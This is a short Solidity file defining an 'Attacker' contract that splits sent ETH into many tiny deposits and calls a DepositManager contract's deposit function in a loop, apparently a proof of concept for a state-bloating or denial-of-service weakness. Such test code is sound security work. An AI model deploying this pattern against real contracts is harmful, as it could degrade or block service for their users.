// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./DepositManager.sol";

contract Attacker {
    DepositManager public target;

    constructor(address _target) {
        target = DepositManager(_target);
    }

    function attack(uint256 numDeposits) external payable {
        require(msg.value >= numDeposits, "Not enough ETH provided");
        uint256 depositAmount = msg.value / numDeposits;
        require(depositAmount > 0, "Deposit amount must be greater than 0");

        for (uint256 i = 0; i < numDeposits; i++) {
            target.deposit{value: depositAmount}();
        }
    }
}